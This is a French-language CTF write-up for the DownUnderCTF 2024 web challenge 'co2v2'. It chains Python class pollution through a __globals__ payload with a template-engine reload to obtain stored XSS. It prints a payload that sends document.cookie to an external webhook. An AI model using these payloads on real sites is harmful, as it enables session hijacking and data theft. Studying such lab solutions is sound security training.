---
title: "co2v2"
excerpt: "Web, downunder 2024"
coverImage: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
date: "2024-07-08"
author:
  name: dolipr4necrypt0
  picture: "/assets/blog/authors/dolipr4necrypt0.png"
ogImage:
  url: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
---

[Source du challenge](https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/co2v2/src)

Ce challenge est la suite de co2 dans laquelle on a trouvé une vulnérabilité de type prototype pollution : [https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution). Cette vulnérabilité nous permettait de réécrire n'importe quelle variable globale à travers la route /save_feedback avec comme payload ```{"__class__":{"__init__":{"__globals__":{"GLOBAL_VAR":"VALUE"}}}}```. Ce payload nous permet de remonter la hiérarchie python jusqu'à tomber sur l'objet __globals__ et ainsi accéder aux dictionnaires des variables globales.

Dans ce challenge, la première chose que l'on remarque c'est la présence d'un bot xss avec le flag dans les cookies. Lorsqu'on accède à la route /api/v1/report, on déclenche le bot xss qui visit la page d'accueil. On sait donc que l'on doit introduire un script js dans la page d'accueil. Ce qui tombe bien vu que les blog posts sont affichés sur l'accueil lorsque les posts sont publics.

On commence par introduire des simples balises html dans un post pour voir le résultat, malheureusement le html n'est pas interprété. En lisant le code, on voit que notre input est passé directement dans la base de donnée sans modification. On remarque aussi une variable globale intéressante TEMPLATES_ESCAPE_ALL = True, qui va faire le lien avec le premier challenge. Cette variable globale est passé au moteur de Template qui va s'occuper de l'escaping.

On peut passer TEMPLATES_ESCAPE_ALL à False grâce à la vulnérabilité du premier challenge. Cependant, nos balises html ne sont toujours pas interprétés. Le problème est que le moteur de template est chargé une unique fois au démarrage et que la modification de TEMPLATES_ESCAPE_ALL n'est pas suffisante. Il nous faut recharger le moteur de Template avec la modification de notre variable. Heureusement, la route /admin/update-accepted-templates nous permet de faire cette action.

Cette fois ci, les balises html sont interprétés. Pour finir, ils nous suffit d'introduire le script suivant dans un blog post public
```javascript
<script>fetch("http://<webhook>/"+btoa(document.cookie))</script>
```
 et de trigger la visite du bot xss pour récupérer les cookies et le flag.
